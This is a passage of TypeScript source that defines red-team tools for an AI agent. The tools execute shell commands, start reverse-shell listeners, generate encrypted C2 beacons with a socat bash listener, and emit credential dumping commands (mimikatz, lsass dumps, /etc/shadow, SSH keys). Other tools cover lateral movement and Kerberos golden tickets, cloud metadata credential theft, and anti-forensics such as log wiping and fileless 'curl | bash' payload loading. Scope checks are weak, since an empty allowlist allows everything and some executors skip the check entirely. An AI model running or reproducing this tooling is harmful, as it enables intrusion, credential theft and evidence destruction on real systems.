						hash: "",
						dryRun: true,
						aborted: false,
						outOfScope: false,
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const timeout = v.timeoutMs ?? 60000;
				try {
					const { stdout, stderr } = await run(v.command, {
						timeout,
						maxBuffer: 1024 * 1024,
					});
					const { createHash } = await import("node:crypto");
					const hash = createHash("sha256")
						.update(stdout + stderr)
						.digest("hex");
					auditLog.push({
						ts: Date.now(),
						target: v.target,
						command: v.command,
						hash,
						code: 0,
					});
					return {
						stdout: stdout.slice(0, 50000),
						stderr: stderr.slice(0, 50000),
						code: 0,
						hash,
						dryRun: false,
						aborted: false,
						outOfScope: false,
					};
				} catch (e: unknown) {
					const err = e as {
						stdout?: string;
						stderr?: string;
						code?: number;
						message?: string;
					};
					const out = err.stdout ?? "";
					const errout = err.stderr ?? err.message ?? String(e);
					const { createHash } = await import("node:crypto");
					const hash = createHash("sha256")
						.update(out + errout)
						.digest("hex");
					auditLog.push({
						ts: Date.now(),
						target: v.target,
						command: v.command,
						hash,
						code: err.code ?? 1,
					});
					return {
						stdout: out.slice(0, 50000),
						stderr: errout.slice(0, 50000),
						code: err.code ?? 1,
						hash,
						dryRun: false,
						aborted: false,
						outOfScope: false,
					};
				}
			},
		}) as AgentTool,
	);

	const ExecBatchSchema = z.object({
		commands: z.array(z.string().min(1)).min(1),
		target: z.string().optional(),
		stopOnError: z.boolean().optional(),
	});
	tools.push(
		createTool<
			{ commands: string[]; target?: string; stopOnError?: boolean },
			{ results: { command: string; code: number; stdout: string }[] }
		>({
			name: "rt_exec_batch",
			description:
				"Execute multiple shell commands sequentially with scope/dry-run enforcement.",
			inputSchema: zodToJsonSchema(ExecBatchSchema),
			execute: async (input) => {
				const v = validateWithZod(ExecBatchSchema, input);
				const results: { command: string; code: number; stdout: string }[] = [];
				for (const cmd of v.commands) {
					if (killed) break;
					const r = await (async () => {
						// reuse rt_exec logic inline
						if (v.target) {
							const t = v.target.toLowerCase();
							const inScope =
								scopeAllowlist.size === 0 ||
								scopeAllowlist.has(t) ||
								[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
							if (!inScope) return { stdout: "", code: -1 };
						}
						if (dryRunMode) return { stdout: "[dry-run]", code: 0 };
						const { exec } = await import("node:child_process");
						const { promisify } = await import("node:util");
						try {
							const { stdout } = await promisify(exec)(cmd, {
								timeout: 60000,
								maxBuffer: 1024 * 1024,
							});
							return { stdout: stdout.slice(0, 20000), code: 0 };
						} catch (e: unknown) {
							const err = e as { stdout?: string; code?: number };
							return {
								stdout: (err.stdout ?? "").slice(0, 20000),
								code: err.code ?? 1,
							};
						}
					})();
					results.push({ command: cmd, code: r.code, stdout: r.stdout });
					if (v.stopOnError && r.code !== 0) break;
				}
				return { results };
			},
		}) as AgentTool,
	);

	// --- Real TCP listener (OOB/catch) ---
	const listeners = new Map<
		string,
		{ server: import("node:net").Server; captured: string[]; port: number }
	>();
	const ListenerStartSchema = z.object({
		port: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<{ port?: number }, { id: string; port: number }>({
			name: "rt_listener_start",
			description:
				"Start a real TCP listener to catch reverse shells/callbacks. Returns id and bound port.",
			inputSchema: zodToJsonSchema(ListenerStartSchema),
			execute: async (input) => {
				const v = validateWithZod(ListenerStartSchema, input);
				const net = await import("node:net");
				const id = `lst_${Date.now()}`;
				const captured: string[] = [];
				const server = net.createServer((sock) => {
					sock.on("data", (d) => captured.push(d.toString("utf8")));
					sock.write("connected\n");
				});
				const port = await new Promise<number>((resolve, reject) => {
					server.listen(v.port ?? 0, "0.0.0.0", () => {
						const addr = server.address();
						if (addr && typeof addr === "object") resolve(addr.port);
						else reject(new Error("no address"));
					});
					server.on("error", reject);
				});
				listeners.set(id, { server, captured, port });
				return { id, port };
			},
		}) as AgentTool,
	);

	const ListenerPollSchema = z.object({ id: z.string().min(1) });
	tools.push(
		createTool<{ id: string }, { captured: string[]; count: number }>({
			name: "rt_listener_poll",
			description: "Poll a TCP listener for captured data.",
			inputSchema: zodToJsonSchema(ListenerPollSchema),
			execute: async (input) => {
				const v = validateWithZod(ListenerPollSchema, input);
				const l = listeners.get(v.id);
				if (!l) return { captured: [], count: 0 };
				return { captured: [...l.captured], count: l.captured.length };
			},
		}) as AgentTool,
	);

	const ListenerStopSchema = z.object({ id: z.string().min(1) });
	tools.push(
		createTool<{ id: string }, { stopped: boolean }>({
			name: "rt_listener_stop",
			description: "Stop a TCP listener.",
			inputSchema: zodToJsonSchema(ListenerStopSchema),
			execute: async (input) => {
				const v = validateWithZod(ListenerStopSchema, input);
				const l = listeners.get(v.id);
				if (l) {
					l.server.close();
					listeners.delete(v.id);
				}
				return { stopped: true };
			},
		}) as AgentTool,
	);

	// --- Audit trail ---
	tools.push(
		createTool<
			Record<string, never>,
			{ entries: typeof auditLog; count: number }
		>({
			name: "rt_audit_tail",
			description: "Return the in-memory audit trail of executed commands.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return { entries: [...auditLog], count: auditLog.length };
			},
		}) as AgentTool,
	);

	// --- Verification helper ---
	const VerifyExecSchema = z.object({
		command: z.string().min(1),
		expected: z.string().min(1),
		target: z.string().optional(),
	});
	tools.push(
		createTool<
			{ command: string; expected: string; target?: string },
			{ verified: boolean; output: string; code: number }
		>({
			name: "rt_verify_exec",
			description:
				"Run a command and verify its output contains an expected marker.",
			inputSchema: zodToJsonSchema(VerifyExecSchema),
			execute: async (input) => {
				const v = validateWithZod(VerifyExecSchema, input);
				if (killed) return { verified: false, output: "killed", code: -1 };
				if (v.target) {
					const t = v.target.toLowerCase();
					const inScope =
						scopeAllowlist.size === 0 ||
						scopeAllowlist.has(t) ||
						[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
					if (!inScope)
						return { verified: false, output: "out of scope", code: -1 };
				}
				if (dryRunMode)
					return { verified: false, output: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(v.command, {
						timeout: 60000,
						maxBuffer: 1024 * 1024,
					});
					return {
						verified: stdout.includes(v.expected),
						output: stdout.slice(0, 20000),
						code: 0,
					};
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					const out = err.stdout ?? "";
					return {
						verified: out.includes(v.expected),
						output: out.slice(0, 20000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Advanced stealth & evasion ---

	const TlsFpSchema = z.object({
		host: z.string().min(1),
		port: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ host: string; port?: number },
			{ commands: string[]; ja3: string }
		>({
			name: "rt_ref_tls_fingerprint",
			description:
				"Generate TLS/JA3 fingerprinting and custom cipher commands.",
			inputSchema: zodToJsonSchema(TlsFpSchema),
			execute: async (input) => {
				const v = validateWithZod(TlsFpSchema, input);
				const p = v.port ?? 443;
				return {
					commands: [
						`openssl s_client -connect ${v.host}:${p} -servername ${v.host} </dev/null 2>/dev/null | openssl x509 -text -noout`,
						`curl --tlsv1.3 --ciphers 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256' https://${v.host}/ -v`,
						`nmap --script ssl-enum-ciphers -p ${p} ${v.host}`,
					],
					ja3: "custom-ja3-placeholder",
				};
			},
		}) as AgentTool,
	);

	const ProxyChainSchema = z.object({
		proxies: z.array(z.string().min(1)).min(1),
	});
	tools.push(
		createTool<{ proxies: string[] }, { chain: string; healthCheck: string }>({
			name: "rt_ref_proxy_chain",
			description: "Build a proxy chain command with health checks.",
			inputSchema: zodToJsonSchema(ProxyChainSchema),
			execute: async (input) => {
				const v = validateWithZod(ProxyChainSchema, input);
				const chain = v.proxies.join(" -> ");
				return {
					chain,
					healthCheck: v.proxies
						.map(
							(p) =>
								`curl -x ${p} -s -o /dev/null -w "%{http_code}" https://httpbin.org/ip`,
						)
						.join(" && "),
				};
			},
		}) as AgentTool,
	);

	const TorSchema = z.object({ port: z.number().int().positive().optional() });
	tools.push(
		createTool<{ port?: number }, { config: string; command: string }>({
			name: "rt_ref_tor_config",
			description: "Generate Tor/SOCKS5 configuration and usage command.",
			inputSchema: zodToJsonSchema(TorSchema),
			execute: async (input) => {
				const v = validateWithZod(TorSchema, input);
				const p = v.port ?? 9050;
				return {
					config: `SocksPort ${p}\nControlPort 9051\nCookieAuthentication 1`,
					command: `proxychains4 -f /etc/proxychains4.conf curl https://httpbin.org/ip`,
				};
			},
		}) as AgentTool,
	);

	const DomainFrontSchema = z.object({
		front: z.string().min(1),
		host: z.string().min(1),
		path: z.string().optional(),
	});
	tools.push(
		createTool<
			{ front: string; host: string; path?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_domain_front",
			description: "Execute domain fronting request.",
			inputSchema: zodToJsonSchema(DomainFrontSchema),
			execute: async (input) => {
				const v = validateWithZod(DomainFrontSchema, input);
				const cmd = `curl https://${v.front}${v.path ?? "/"} -H "Host: ${v.host}" -v`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- C2 enhanced ---
	const C2EncSchema = z.object({
		host: z.string().min(1),
		port: z.number().int().positive(),
		key: z.string().optional(),
		protocol: z.enum(["https", "dns", "mtls"]).optional(),
	});
	tools.push(
		createTool<
			{ host: string; port: number; key?: string; protocol?: string },
			{ beacon: string; listener: string; encrypt: string }
		>({
			name: "rt_ref_c2_encrypted",
			description: "Generate encrypted C2 beacon + listener with key.",
			inputSchema: zodToJsonSchema(C2EncSchema),
			execute: async (input) => {
				const v = validateWithZod(C2EncSchema, input);
				const key = v.key ?? "changeme";
				return {
					beacon: `curl -s https://${v.host}:${v.port}/beacon -H "X-Key: ${key}" -d "$(hostname)"`,
					listener: `socat OPENSSL-LISTEN:${v.port},cert=server.pem,verify=0,fork EXEC:/bin/bash`,
					encrypt: `openssl enc -aes-256-cbc -salt -in data.txt -out data.enc -pass pass:${key}`,
				};
			},
		}) as AgentTool,
	);

	// --- Privesc execution + parsing ---
	const PrivescRunSchema = z.object({
		platform: z.enum(["linux", "windows"]).optional(),
	});
	tools.push(
		createTool<
			{ platform?: string },
			{ commands: { name: string; cmd: string; parse: string }[] }
		>({
			name: "rt_ref_privesc_run",
			description: "Run privilege escalation enumeration and parse output.",
			inputSchema: zodToJsonSchema(PrivescRunSchema),
			execute: async (input) => {
				const v = validateWithZod(PrivescRunSchema, input);
				const isWin = v.platform === "windows";
				if (isWin) {
					return {
						commands: [
							{
								name: "whoami_priv",
								cmd: "whoami /priv",
								parse: "SeImpersonatePrivilege|SeAssignPrimaryToken",
							},
							{
								name: "services",
								cmd: "wmic service get name,pathname,startmode | findstr /i auto",
								parse: "unquoted paths",
							},
						],
					};
				}
				return {
					commands: [
						{ name: "sudo", cmd: "sudo -l", parse: "NOPASSWD" },
						{
							name: "suid",
							cmd: "find / -perm -4000 -type f 2>/dev/null",
							parse: "list",
						},
						{
							name: "caps",
							cmd: "getcap -r / 2>/dev/null",
							parse: "cap_setuid",
						},
						{
							name: "cron",
							cmd: "cat /etc/crontab; ls -la /etc/cron.d",
							parse: "writable",
						},
					],
				};
			},
		}) as AgentTool,
	);

	// --- Lateral movement execution ---
	const LateralExecSchema = z.object({
		technique: z.string().min(1),
		host: z.string().min(1),
		user: z.string().optional(),
		secret: z.string().optional(),
	});
	tools.push(
		createTool<
			{ technique: string; host: string; user?: string; secret?: string },
			{ command: string; verify: string }
		>({
			name: "rt_ref_lateral_exec",
			description:
				"Execute lateral movement via chosen technique and verify access.",
			inputSchema: zodToJsonSchema(LateralExecSchema),
			execute: async (input) => {
				const v = validateWithZod(LateralExecSchema, input);
				const auth = v.secret
					? v.secret.length === 32
						? `-hashes :${v.secret}`
						: `-password '${v.secret}'`
					: "";
				const u = v.user ? `${v.user}@${v.host}` : v.host;
				let cmd = "";
				switch (v.technique) {
					case "psexec":
						cmd = `impacket-psexec ${auth} ${u}`;
						break;
					case "wmiexec":
						cmd = `impacket-wmiexec ${auth} ${u}`;
						break;
					case "smbexec":
						cmd = `impacket-smbexec ${auth} ${u}`;
						break;
					case "winrm":
						cmd = `evil-winrm -i ${v.host} -u ${v.user ?? "administrator"} ${v.secret ? `-p '${v.secret}'` : ""}`;
						break;
					case "ssh":
						cmd = `ssh ${v.user ?? "root"}@${v.host}`;
						break;
					default:
						cmd = `impacket-wmiexec ${auth} ${u}`;
						break;
				}
				return { command: cmd, verify: "whoami" };
			},
		}) as AgentTool,
	);

	// --- Cred dump execution ---
	const CredDumpExecSchema = z.object({
		platform: z.enum(["linux", "windows"]).optional(),
	});
	tools.push(
		createTool<
			{ platform?: string },
			{ commands: { tool: string; cmd: string; parse: string }[] }
		>({
			name: "rt_ref_cred_dump_exec",
			description: "Execute credential dumping and parse secrets.",
			inputSchema: zodToJsonSchema(CredDumpExecSchema),
			execute: async (input) => {
				const v = validateWithZod(CredDumpExecSchema, input);
				const isWin = v.platform === "windows";
				if (isWin) {
					return {
						commands: [
							{
								tool: "mimikatz",
								cmd: "sekurlsa::logonpasswords",
								parse: "NTLM",
							},
							{
								tool: "comsvcs",
								cmd: "rundll32 comsvcs.dll MiniDump",
								parse: "lsass.dmp",
							},
						],
					};
				}
				return {
					commands: [
						{ tool: "shadow", cmd: "cat /etc/shadow", parse: "hash" },
						{
							tool: "ssh",
							cmd: "find / -name id_rsa 2>/dev/null",
							parse: "key",
						},
						{ tool: "history", cmd: "cat ~/.bash_history", parse: "password" },
					],
				};
			},
		}) as AgentTool,
	);

	// --- Kerberos execution ---
	const KerberosExecSchema = z.object({
		technique: z.string().min(1),
		domain: z.string().optional(),
		user: z.string().optional(),
	});
	tools.push(
		createTool<
			{ technique: string; domain?: string; user?: string },
			{ commands: string[]; parse: string }
		>({
			name: "rt_ref_kerberos_exec",
			description: "Execute Kerberos/AD attack and parse tickets/hashes.",
			inputSchema: zodToJsonSchema(KerberosExecSchema),
			execute: async (input) => {
				const v = validateWithZod(KerberosExecSchema, input);
				const d = v.domain ?? "DOMAIN.LOCAL";
				const u = v.user ?? "user";
				const cmds: string[] = [];
				let parse = "";
				switch (v.technique) {
					case "kerberoast":
						cmds.push(
							`impacket-GetUserSPNs ${d}/${u} -request -outputfile kerberoast.txt`,
						);
						parse = "TGS";
						break;
					case "asrep":
						cmds.push(
							`impacket-GetNPUsers ${d}/ -usersfile users.txt -outputfile asrep.txt`,
						);
						parse = "AS-REP";
						break;
					case "dcsync":
						cmds.push(`impacket-secretsdump ${d}/${u}@dc.${d} -just-dc`);
						parse = "hash";
						break;
					case "golden":
						cmds.push(
							`impacket-ticketer -nthash <krbtgt> -domain-sid <sid> -domain ${d} administrator`,
						);
						parse = "ticket";
						break;
					default:
						cmds.push(`impacket-GetUserSPNs ${d}/${u} -request`);
						parse = "TGS";
						break;
				}
				return { commands: cmds, parse };
			},
		}) as AgentTool,
	);

	// --- Cloud recon execution ---
	const CloudExecSchema = z.object({
		provider: z.enum(["aws", "azure", "gcp"]).optional(),
	});
	tools.push(
		createTool<
			{ provider?: string },
			{ commands: { name: string; cmd: string; parse: string }[] }
		>({
			name: "rt_ref_cloud_exec",
			description: "Execute cloud reconnaissance commands.",
			inputSchema: zodToJsonSchema(CloudExecSchema),
			execute: async (input) => {
				const v = validateWithZod(CloudExecSchema, input);
				const p = v.provider ?? "aws";
				if (p === "aws") {
					return {
						commands: [
							{
								name: "identity",
								cmd: "aws sts get-caller-identity",
								parse: "Account",
							},
							{ name: "s3", cmd: "aws s3 ls", parse: "buckets" },
							{ name: "iam", cmd: "aws iam list-users", parse: "users" },
							{
								name: "metadata",
								cmd: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
								parse: "role",
							},
						],
					};
				}
				if (p === "azure") {
					return {
						commands: [
							{
								name: "metadata",
								cmd: "curl -s -H 'Metadata: true' http://169.254.169.254/metadata/instance?api-version=2021-02-01",
								parse: "compute",
							},
							{
								name: "storage",
								cmd: "az storage account list",
								parse: "accounts",
							},
						],
					};
				}
				return {
					commands: [
						{
							name: "metadata",
							cmd: "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/",
							parse: "instance",
						},
						{ name: "buckets", cmd: "gsutil ls", parse: "gs://" },
					],
				};
			},
		}) as AgentTool,
	);

	// --- Container escape verification ---
	tools.push(
		createTool<
			Record<string, never>,
			{ checks: { name: string; cmd: string; indicator: string }[] }
		>({
			name: "rt_ref_container_escape_verify",
			description: "Verify container escape vectors.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					checks: [
						{
							name: "docker_sock",
							cmd: "ls -la /var/run/docker.sock",
							indicator: "docker.sock",
						},
						{
							name: "privileged",
							cmd: "capsh --print",
							indicator: "cap_sys_admin",
						},
						{
							name: "k8s_token",
							cmd: "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
							indicator: "eyJ",
						},
						{ name: "cgroup", cmd: "cat /proc/1/cgroup", indicator: "docker" },
					],
				};
			},
		}) as AgentTool,
	);

	// --- Screenshot / evidence capture ---
	const ScreenshotSchema = z.object({
		url: z.string().min(1),
		output: z.string().optional(),
	});
	tools.push(
		createTool<
			{ url: string; output?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_screenshot",
			description: "Execute screenshot capture.",
			inputSchema: zodToJsonSchema(ScreenshotSchema),
			execute: async (input) => {
				const v = validateWithZod(ScreenshotSchema, input);
				const out = v.output ?? "screenshot.png";
				const cmd = `chromium --headless --screenshot=${out} ${v.url}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 60000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- Persistent audit hash chain ---
	const AuditPersistSchema = z.object({ file: z.string().optional() });
	tools.push(
		createTool<{ file?: string }, { path: string; entries: number }>({
			name: "rt_audit_persist",
			description:
				"Persist the in-memory audit trail to a file with hash chain.",
			inputSchema: zodToJsonSchema(AuditPersistSchema),
			execute: async (input) => {
				const v = validateWithZod(AuditPersistSchema, input);
				const path = v.file ?? "redteam-audit.log";
				const fs = await import("node:fs");
				const { createHash } = await import("node:crypto");
				let chain = "";
				const lines: string[] = [];
				for (const e of auditLog) {
					const h = createHash("sha256")
						.update(chain + JSON.stringify(e))
						.digest("hex");
					chain = h;
					lines.push(JSON.stringify({ ...e, chain: h }));
				}
				fs.writeFileSync(path, `${lines.join("\n")}\n`);
				return { path, entries: lines.length };
			},
		}) as AgentTool,
	);

	// --- Memory auto-store on success ---
	const LessonSchema = z.object({
		target: z.string().min(1),
		technique: z.string().min(1),
		outcome: z.string().min(1),
		notes: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; technique: string; outcome: string; notes?: string },
			{ memoryEntry: unknown }
		>({
			name: "rt_lesson_store",
			description:
				"Build a memory_store-ready entry (kind=skill) for a successful technique.",
			inputSchema: zodToJsonSchema(LessonSchema),
			execute: async (input) => {
				const v = validateWithZod(LessonSchema, input);
				const entry = {
					kind: "skill",
					key: `rt.lesson.${v.target}.${v.technique}`,
					value: `${v.outcome}${v.notes ? ` — ${v.notes}` : ""}`,
					confidence: 0.9,
					tags: ["redteam", v.target, v.technique],
				};
				const { appendFileSync } = await import("node:fs");
				appendFileSync("lessons.jsonl", `${JSON.stringify(entry)}\n`);
				return { memoryEntry: entry, persisted: true };
			},
		}) as AgentTool,
	);

	// --- Parallel execution ---
	const ParallelSchema = z.object({
		commands: z.array(z.string().min(1)).min(1),
		timeoutMs: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ commands: string[]; timeoutMs?: number },
			{ results: { command: string; code: number; stdout: string }[] }
		>({
			name: "rt_parallel_exec",
			description:
				"Execute multiple commands in parallel with scope/dry-run enforcement.",
			inputSchema: zodToJsonSchema(ParallelSchema),
			execute: async (input) => {
				const v = validateWithZod(ParallelSchema, input);
				if (killed) return { results: [] };
				if (dryRunMode)
					return {
						results: v.commands.map((c) => ({
							command: c,
							code: 0,
							stdout: "[dry-run]",
						})),
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const timeout = v.timeoutMs ?? 60000;
				const results = await Promise.all(
					v.commands.map(async (cmd) => {
						try {
							const { stdout } = await run(cmd, {
								timeout,
								maxBuffer: 1024 * 1024,
							});
							return { command: cmd, code: 0, stdout: stdout.slice(0, 20000) };
						} catch (e: unknown) {
							const err = e as { stdout?: string; code?: number };
							return {
								command: cmd,
								code: err.code ?? 1,
								stdout: (err.stdout ?? "").slice(0, 20000),
							};
						}
					}),
				);
				return { results };
			},
		}) as AgentTool,
	);

	// --- Sleep obfuscation / process injection commands ---
	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_ref_sleep_obfuscation",
			description:
				"Generate sleep obfuscation and process injection commands for evasion.",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"Ekko sleep obfuscation (RtlRegisterWait + NtContinue)",
						"FOLIAGE (CreateTimerQueueTimer)",
						"process hollowing: NtUnmapViewOfSection + WriteProcessMemory",
						"PPID spoofing via STARTUPINFOEX + PROC_THREAD_ATTRIBUTE_PARENT_PROCESS",
						"module stomping: overwrite legitimate DLL .text section",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Anti-forensics ---
	tools.push(
		createTool<Record<string, never>, { commands: string[] }>({
			name: "rt_anti_forensics",
			description:
				"Generate anti-forensics commands (timestomping, log wiping, fileless).",
			inputSchema: zodToJsonSchema(z.object({})),
			execute: async () => {
				return {
					commands: [
						"timestomp: touch -r /etc/passwd /tmp/payload; touch -t 202001010000 /tmp/payload",
						"log wipe: echo '' > /var/log/auth.log; rm -f /var/log/wtmp /var/log/btmp",
						"history: history -c; rm -f ~/.bash_history ~/.zsh_history; export HISTFILE=/dev/null",
						'fileless: python3 -c \'exec(__import__("urllib.request").request.urlopen("http://x/payload.py").read())\'',
						"memory-only: curl -s http://x/payload | bash",
						"shred: shred -u -z -n 3 /tmp/payload",
					],
				};
			},
		}) as AgentTool,
	);

	// --- Scope enforcement runtime guard ---
	const ScopeEnforceSchema = z.object({
		target: z.string().min(1),
		action: z.string().min(1),
	});
	tools.push(
		createTool<
			{ target: string; action: string },
			{ allowed: boolean; reason: string }
		>({
			name: "rt_scope_enforce",
			description:
				"Runtime guard: check if an action on a target is allowed by scope. Abort if not.",
			inputSchema: zodToJsonSchema(ScopeEnforceSchema),
			execute: async (input) => {
				const v = validateWithZod(ScopeEnforceSchema, input);
				if (killed) return { allowed: false, reason: "kill switch active" };
				const t = v.target.toLowerCase();
				const inScope =
					scopeAllowlist.size === 0 ||
					scopeAllowlist.has(t) ||
					[...scopeAllowlist].some((s) => t.endsWith(s) || s.endsWith(t));
				if (!inScope) return { allowed: false, reason: "target out of scope" };
				return { allowed: true, reason: "in scope" };
			},
		}) as AgentTool,
	);

	// --- External real-tool integration ---

	const ToolCheckSchema = z.object({ tool: z.string().min(1) });
	tools.push(
		createTool<
			{ tool: string },
			{ installed: boolean; path: string; version: string }
		>({
			name: "rt_tool_check",
			description:
				"Check if an external tool is installed and get its version.",
			inputSchema: zodToJsonSchema(ToolCheckSchema),
			execute: async (input) => {
				const v = validateWithZod(ToolCheckSchema, input);
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const isWin = process.platform === "win32";
				const whichCmd = isWin ? `where ${v.tool}` : `which ${v.tool}`;
				try {
					const { stdout } = await run(whichCmd, { timeout: 10000 });
					const path = stdout.trim().split(/\r?\n/)[0];
					let version = "";
					try {
						const { stdout: vout } = await run(
							`${v.tool} --version 2>&1 || ${v.tool} -version 2>&1 || ${v.tool} -V 2>&1`,
							{ timeout: 10000 },
						);
						version = vout.trim().split(/\r?\n/)[0];
					} catch {
						version = "unknown";
					}
					return { installed: true, path, version };
				} catch {
					return { installed: false, path: "", version: "" };
				}
			},
		}) as AgentTool,
	);

	const ToolRunSchema = z.object({
		tool: z.string().min(1),
		args: z.string().min(1),
		timeoutMs: z.number().int().positive().optional(),
	});
	tools.push(
		createTool<
			{ tool: string; args: string; timeoutMs?: number },
			{ stdout: string; stderr: string; code: number; command: string }
		>({
			name: "rt_tool_run",
			description: "Run any external tool with arguments. Captures output.",
			inputSchema: zodToJsonSchema(ToolRunSchema),
			execute: async (input) => {
				const v = validateWithZod(ToolRunSchema, input);
				if (killed)
					return { stdout: "", stderr: "killed", code: -1, command: "" };
				if (dryRunMode)
					return {
						stdout: "[dry-run]",
						stderr: "",
						code: 0,
						command: `${v.tool} ${v.args}`,
					};
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				const run = promisify(exec);
				const cmd = `${v.tool} ${v.args}`;
				try {
					const { stdout, stderr } = await run(cmd, {
						timeout: v.timeoutMs ?? 300000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return {
						stdout: stdout.slice(0, 100000),
						stderr: stderr.slice(0, 100000),
						code: 0,
						command: cmd,
					};
				} catch (e: unknown) {
					const err = e as {
						stdout?: string;
						stderr?: string;
						code?: number;
						message?: string;
					};
					return {
						stdout: (err.stdout ?? "").slice(0, 100000),
						stderr: (err.stderr ?? err.message ?? String(e)).slice(0, 100000),
						code: err.code ?? 1,
						command: cmd,
					};
				}
			},
		}) as AgentTool,
	);

	// --- nmap ---
	const NmapSchema = z.object({
		target: z.string().min(1),
		flags: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; flags?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_nmap",
			description: "Run nmap scan with service/version detection.",
			inputSchema: zodToJsonSchema(NmapSchema),
			execute: async (input) => {
				const v = validateWithZod(NmapSchema, input);
				const flags = v.flags ?? "-sV -sC -O -T4";
				const cmd = `nmap ${flags} ${v.target}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- nuclei ---
	const NucleiSchema = z.object({
		target: z.string().min(1),
		templates: z.string().optional(),
		severity: z.string().optional(),
	});
	tools.push(
		createTool<
			{ target: string; templates?: string; severity?: string },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_nuclei",
			description: "Run nuclei template scan.",
			inputSchema: zodToJsonSchema(NucleiSchema),
			execute: async (input) => {
				const v = validateWithZod(NucleiSchema, input);
				let cmd = `nuclei -u ${v.target}`;
				if (v.templates) cmd += ` -t ${v.templates}`;
				if (v.severity) cmd += ` -severity ${v.severity}`;
				cmd += " -json";
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
		}) as AgentTool,
	);

	// --- sqlmap ---
	const SqlmapSchema = z.object({
		url: z.string().min(1),
		param: z.string().optional(),
		level: z.number().int().optional(),
		risk: z.number().int().optional(),
	});
	tools.push(
		createTool<
			{ url: string; param?: string; level?: number; risk?: number },
			{ command: string; stdout: string; code: number }
		>({
			name: "rt_sqlmap",
			description: "Run sqlmap injection test.",
			inputSchema: zodToJsonSchema(SqlmapSchema),
			execute: async (input) => {
				const v = validateWithZod(SqlmapSchema, input);
				let cmd = `sqlmap -u "${v.url}" --batch --random-agent`;
				if (v.param) cmd += ` -p ${v.param}`;
				if (v.level) cmd += ` --level=${v.level}`;
				if (v.risk) cmd += ` --risk=${v.risk}`;
				if (killed) return { command: cmd, stdout: "killed", code: -1 };
				if (dryRunMode) return { command: cmd, stdout: "[dry-run]", code: 0 };
				const { exec } = await import("node:child_process");
				const { promisify } = await import("node:util");
				try {
					const { stdout } = await promisify(exec)(cmd, {
						timeout: 600000,
						maxBuffer: 10 * 1024 * 1024,
					});
					return { command: cmd, stdout: stdout.slice(0, 100000), code: 0 };
				} catch (e: unknown) {
					const err = e as { stdout?: string; code?: number };
					return {
						command: cmd,
						stdout: (err.stdout ?? "").slice(0, 100000),
						code: err.code ?? 1,
					};
				}
			},
